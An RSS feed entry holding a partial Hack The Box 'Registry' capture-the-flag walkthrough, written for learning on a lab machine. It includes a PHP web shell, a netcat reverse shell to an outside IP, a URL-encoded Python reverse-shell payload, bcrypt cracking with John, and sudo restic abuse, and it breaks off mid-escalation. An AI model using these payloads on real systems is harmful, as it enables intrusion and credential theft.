<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>My pentest notes</title>
    <description>Pentest notes
</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Wed, 08 Apr 2020 16:28:10 -0300</pubDate>
    <lastBuildDate>Wed, 08 Apr 2020 16:28:10 -0300</lastBuildDate>
    <generator>Jekyll v3.8.6</generator>
    
      <item>
        <title>Hack the box Registry Walkthrough</title>
        <description>&lt;p&gt;&lt;small&gt; &lt;i&gt; Tags: HACKTHEBOX | DOCKER | BOLT | CMS | REGISTRY | HARD &lt;/i&gt; &lt;/small&gt;&lt;/p&gt;

&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap 10.10.10.159 -sV -sC -oA scan/stdscan 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 08:53 EDT
Nmap scan report for 10.10.10.159
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt;we can spot three services running&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;SSH 22/TCP&lt;/li&gt;
  &lt;li&gt;HTTP 80/TCP&lt;/li&gt;
  &lt;li&gt;HTTPS 443/TCP&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There’s a very importante information being leaked at the SSL Certificate, a subdomain &lt;code class=&quot;highlighter-rouge&quot;&gt;docker.registry.htb&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;So let’s update our &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts/&lt;/code&gt;file&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:~/hackthebox$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	pwnbox
10.10.10.159    registry.htb docker.registry.htb


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;registryhtb&quot;&gt;registry.htb&lt;/h2&gt;

&lt;p&gt;Going into the main website we see just this default nginx page. I used a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;rustbuster&lt;/code&gt;to find some new directories.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:~/hackthebox$ rustbuster dir -u &quot;http://registry.htb&quot; -w /usr/share/wordlists/dirb/common.txt  --no-banner
~ rustbuster v3.0.3 ~ by phra &amp;amp; ps1dr3x ~

[?] Started at	: 2020-04-03 09:12:32

GET	200 OK				http://registry.htb/
GET     403 Forbidden                   http://registry.htb/.bash_history
GET     403 Forbidden                   http://registry.htb/.hta
GET     403 Forbidden                   http://registry.htb/.htaccess
GET     403 Forbidden                   http://registry.htb/.htpasswd
GET     200 OK                          http://registry.htb/index.html
GET     301 Moved Permanently           http://registry.htb/install
						=&amp;gt; http://registry.htb/install/
  [00:00:51] ########################################    4611/4611    ETA: 00:00:00 req/s: 90
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/jekyll/8/registry_main_install.png&quot; alt=&quot;registry_main_install&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rustbuster&lt;/code&gt; found a &lt;code class=&quot;highlighter-rouge&quot;&gt;/install&lt;/code&gt; directory. Browsing there, we find a bunch o gibberish that’s clearly a file, we can download with &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt;and save it locally.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://registry.htb/install/ -s &amp;gt; install
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Extracting the file we just got, we see two files&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Readme.md&lt;/li&gt;
  &lt;li&gt;ca.crt&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:~/hackthebox/registry$ cat readme.md 
# Private Docker Registry

- https://docs.docker.com/registry/deploying/
- https://docs.docker.com/engine/security/certificates/
danps@pwnbox:~/hackthebox/registry$ cat ca.crt 
-----BEGIN CERTIFICATE-----
MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
BAMMCFJlZ2lzdHJ5MB4XDTE5MDUwNjIxMTQzNVoXDTI5MDUwMzIxMTQzNVowEzER
MA8GA1UEAwwIUmVnaXN0cnkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQCw9BmNspBdfyc4Mt+teUfAVhepjje0/JE0db9Iqmk1DpjjWfrACum1onvabI/5
T5ryXgWb9kS8C6gzslFfPhr7tTmpCilaLPAJzHTDhK+HQCMoAhDzKXikE2dSpsJ5
zZKaJbmtS6f3qLjjJzMPqyMdt/i4kn2rp0ZPd+58pIk8Ez8C8pB1tO7j3+QAe9wc
r6vx1PYvwOYW7eg7TEfQmmQt/orFs7o6uZ1MrnbEKbZ6+bsPXLDt46EvHmBDdUn1
zGTzI3Y2UMpO7RXEN06s6tH4ufpaxlppgOnR2hSvwSXrWyVh2DVG1ZZu+lLt4eHI
qFJvJr5k/xd0N+B+v2HrCOhfAgMBAAGjUzBRMB0GA1UdDgQWBBTpKeRSEzvTkuWX
8/wn9z3DPYAQ9zAfBgNVHSMEGDAWgBTpKeRSEzvTkuWX8/wn9z3DPYAQ9zAPBgNV
HRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQABLgN9x0QNM+hgJIHvTEN3
LAoh4Dm2X5qYe/ZntCKW+ppBrXLmkOm16kjJx6wMIvUNOKqw2H5VsHpTjBSZfnEJ
UmuPHWhvCFzhGZJjKE+An1V4oAiBeQeEkE4I8nKJsfKJ0iFOzjZObBtY2xGkMz6N
7JVeEp9vdmuj7/PMkctD62mxkMAwnLiJejtba2+9xFKMOe/asRAjfQeLPsLNMdrr
CUxTiXEECxFPGnbzHdbtHaHqCirEB7wt+Zhh3wYFVcN83b7n7jzKy34DNkQdIxt9
QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B
-----END CERTIFICATE-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first one we see some links about &lt;code class=&quot;highlighter-rouge&quot;&gt;docker registry&lt;/code&gt; , and the &lt;code class=&quot;highlighter-rouge&quot;&gt;ca.crt&lt;/code&gt;is a file that allow us to login to this private registry? We still don’t know.&lt;/p&gt;

&lt;h2 id=&quot;dockerregistryhtb&quot;&gt;docker.registry.htb&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/jekyll/8/docker_registry.png&quot; alt=&quot;docker_registry&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another blank page, running &lt;code class=&quot;highlighter-rouge&quot;&gt;rustbuster&lt;/code&gt;again.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:~/hackthebox/registry$ rustbuster dir -u &quot;http://docker.registry.htb/&quot; -w /usr/share/wordlists/dirb/common.txt  --no-banner
~ rustbuster v3.0.3 ~ by phra &amp;amp; ps1dr3x ~

[?] Started at	: 2020-04-03 10:47:24

GET	200 OK				                      http://docker.registry.htb/
GET     301 Moved Permanently           http://docker.registry.htb/v2
						=&amp;gt; /v2/
  [00:00:51] ########################################    4611/4611    ETA: 00:00:00 req/s: 90
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We find a &lt;code class=&quot;highlighter-rouge&quot;&gt;v2&lt;/code&gt;directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/jekyll/8/registry_v2.png&quot; alt=&quot;registry_v2&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It ask us for a &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt;and &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt;. I think this part was a bit of guessing but the first thing that I always try is &lt;code class=&quot;highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt; and this time it worked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/jekyll/8/registry_empty.png&quot; alt=&quot;registry_empty&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But we only get these empty curly braces.&lt;/p&gt;

&lt;h2 id=&quot;docker-login&quot;&gt;Docker Login&lt;/h2&gt;

&lt;p&gt;Knowing that we’re dealing with a &lt;code class=&quot;highlighter-rouge&quot;&gt;docker registry&lt;/code&gt; we can try to login to this and check out its images.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:~/hackthebox/registry$ sudo docker login docker.registry.htb
Username: admin
Password: 
Error response from daemon: Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;According to the official docker documentation, we need to add some valid certificates to make it work&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/etc/docker/certs.d/           &amp;lt;-- Certificate directory
    └── docker.registry.htb    &amp;lt;-- Hostname:port
       ├── client.cert         &amp;lt;-- Client certificate
       ├── client.key          &amp;lt;-- Client key
       └── ca.crt              &amp;lt;-- Certificate authority that signed
                                    the registry certificate (the one we extracted from            																																		the install zip)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;First, we generate our client certificate&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl genrsa -out client.key 4096
openssl req -new -x509 -text -key client.key -out client.cert
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we create a folder inside &lt;code class=&quot;highlighter-rouge&quot;&gt;certs.d&lt;/code&gt; and move the certificates. In the end it should look like this&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:/etc/docker/certs.d$ tree
.
└── docker.registry.htb
    ├── ca.crt
    ├── client.cert
    └── client.key

1 directory, 3 files
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we try to login again, we succeed&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:~/hackthebox/registry/certs$ sudo docker login docker.registry.htb
Username: admin
Password: 
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To find what images are stored in this register we can browse to &lt;code class=&quot;highlighter-rouge&quot;&gt;_catalog&lt;/code&gt; inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;/v2&lt;/code&gt;dir.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/jekyll/8/registry_bolt-image.png&quot; alt=&quot;registry_bolt-image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We discover a &lt;code class=&quot;highlighter-rouge&quot;&gt;bolt-image&lt;/code&gt;, let’s pull and run it locally.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo docker pull docker.registry.htb/bolt-image
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:~/hackthebox/registry$ sudo docker images
REPOSITORY                       TAG                 IMAGE ID            CREATED             SIZE
docker.registry.htb/bolt-image   latest              601499e98a60        10 months ago       362MB
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now let’s enumerate it to see if we find any valid credentials.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo docker run -it docker.registry.htb/bolt-image
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Inside the container we can see a &lt;code class=&quot;highlighter-rouge&quot;&gt;.ssh&lt;/code&gt;file inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; directory.&lt;/p&gt;

&lt;p&gt;Looking at the the &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa.pub&lt;/code&gt; file we can see an user &lt;code class=&quot;highlighter-rouge&quot;&gt;bolt&lt;/code&gt;. Another interesting file is &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; which contains the bolt user’s private key, however it is encrypted.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@870d4f2aab64:~/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At first I thought I had to brute force this, but it did not work so I went back to enumerate more the machine.&lt;/p&gt;

&lt;p&gt;Looking at the &lt;code class=&quot;highlighter-rouge&quot;&gt;.viminfo&lt;/code&gt;file inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;directory I noticed some references to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/profile.d/01-ssh.sh&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@870d4f2aab64:~# cat /etc/profile.d/01-ssh.sh 
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect &quot;Enter passphrase for /root/.ssh/id_rsa:&quot;
send &quot;GkOcz221Ftb3ugog\n&quot;;
expect &quot;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&quot;
interact
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It turned out to be a script to add and put the password to the &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Credentials&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;bolt&lt;/li&gt;
  &lt;li&gt;id_rsa
    &lt;ul&gt;
      &lt;li&gt;GkOcz221Ftb3ugog&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s login.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:~/hackthebox/registry$ ssh -i id_rsa bolt@registry.htb
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Fri Apr  3 15:54:38 UTC 2020

  System load:  0.0               Users logged in:                0
  Usage of /:   5.6% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 23%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    154
Last login: Fri Apr  3 15:53:46 2020 from 10.10.14.38
bolt@bolt:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now that we’re inside, let’s fetch our &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bolt@bolt:~$ cat user.txt
ytc0ytdmnz&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;I always like to initiate this part running some default enumeration scripts to get some general idea of what I have to do. In this case I discovered that &lt;code class=&quot;highlighter-rouge&quot;&gt;bolt&lt;/code&gt;is actually a content management system (CMS). There are a few interesting files that we have to analyze to figure out our attack plan.&lt;/p&gt;

&lt;p&gt;Browsing the &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt;folder, we see an interesting file called &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.php&lt;/code&gt; which has the following script&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; 
  &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sudo restic backup -r rest:http://backup.registry.htb/bolt bolt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When I saw this, I realized that the user &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;can run &lt;code class=&quot;highlighter-rouge&quot;&gt;restic&lt;/code&gt;as root without a password. So the current attack plan is:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Exploit the bolt website to get a shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Confirm the theory about &lt;code class=&quot;highlighter-rouge&quot;&gt;restic&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Exploit &lt;code class=&quot;highlighter-rouge&quot;&gt;restic&lt;/code&gt;to read the root.txt file&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;exploiting-bolt-cms&quot;&gt;Exploiting Bolt CMS&lt;/h2&gt;

&lt;p&gt;Googling a bit about bolt RCEs, I found this great &lt;a href=&quot;https://fgsec.net/from-csrf-to-rce-bolt-cms/&quot;&gt;article&lt;/a&gt; that says that basically an authanticated user can write to a &lt;code class=&quot;highlighter-rouge&quot;&gt;config.yml&lt;/code&gt;and change the file extensions that the application allows us to upload.But before we get there we need some admin credentials to login.&lt;/p&gt;

&lt;p&gt;Searching the web files and configs, we find a &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/bolt/app/database/bolt.db&lt;/code&gt;which is very likely to have our credential stored.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strings /var/www/html/bolt/app/database/bolt.db
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;we find&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin $2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Which looks like a username and a hashed password. Running it in &lt;code class=&quot;highlighter-rouge&quot;&gt;John the ripper&lt;/code&gt;It says it is a bcrypt hash and using &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; for a dictionary attack we find the password &lt;code class=&quot;highlighter-rouge&quot;&gt;strawberry&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john hash -w /usr/share/wordlists/rockyou.txt --format=bcrypt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Credentials&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;admin&lt;/li&gt;
  &lt;li&gt;strawberry&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And we login&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/jekyll/8/registry_bolt_login.png&quot; alt=&quot;registry_bolt_login&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we just replay the steps desribed in the article I mentioned. First we need to change the &lt;code class=&quot;highlighter-rouge&quot;&gt;accepted_file_types&lt;/code&gt;in the config.yml file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/jekyll/8/registry_edit.png&quot; alt=&quot;registry_edit&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We just add &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; to this list and now we can upload php files.&lt;/p&gt;

&lt;p&gt;One thing that is important to point out is that this particular box is not allowing us to make outbounds connections, which means that if I create a file to get a reverse shell, it would be something like this:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;  
&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;nc 10.10.14.38 9091 -e /bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But since there’s this protection this would just fail. I struggled a bit to realize that I didn’t actually had to leave the box. Since I had a decent SSH Shell, I could just start a netcat listener on the box and connect to it using localhost.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;  
&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://registry.htb/bolt/files/shell.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22localhost%22,9091));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s upload a file here&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/jekyll/8/registry_upload.png&quot; alt=&quot;registry_upload&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We fire up our netcat on the registry machine on port 9091 and get our new shell!&lt;/p&gt;

&lt;p&gt;Ok, we are &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;now&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bolt:~/html/bolt/files$ whoami
whoami
www-data
www-data@bolt:~/html/bolt/files$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To confirm out theory about &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;restic&lt;/code&gt;we run &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bolt:~/html/bolt/files$ sudo -l
sudo -l
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can now be sure that www-data can run &lt;strong&gt;/usr/bin/restic backup -r rest&lt;/strong&gt; as root without a password.&lt;/p&gt;

&lt;h2 id=&quot;backup-and-dump-roottxt-file&quot;&gt;Backup and dump root.txt file&lt;/h2&gt;

&lt;p&gt;Now is the the part where I had to do a ton of research to understand this program. First I read the &lt;a href=&quot;https://restic.readthedocs.io/en/latest/&quot;&gt;documentation&lt;/a&gt; for restic.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-l&quot;&gt;Restic is a fast and secure backup program. 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That’s what the introduction tells us. Reading through the docs, I noticed two important thing:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;We can user a rest server as a repository&lt;/li&gt;
  &lt;li&gt;We can dump the files that we backed up to standard output (stdout)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Which gave me the idea that I had an arbitrary read on the server&lt;/p&gt;

&lt;p&gt;I found this &lt;a href=&quot;https://github.com/restic/rest-server&quot;&gt;Github&lt;/a&gt; that has the binaries for running a rest server locally (Remember we can’t make outbounds connections). I transferred the file using over &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; and started a server locally on the port 8000&lt;/p&gt;

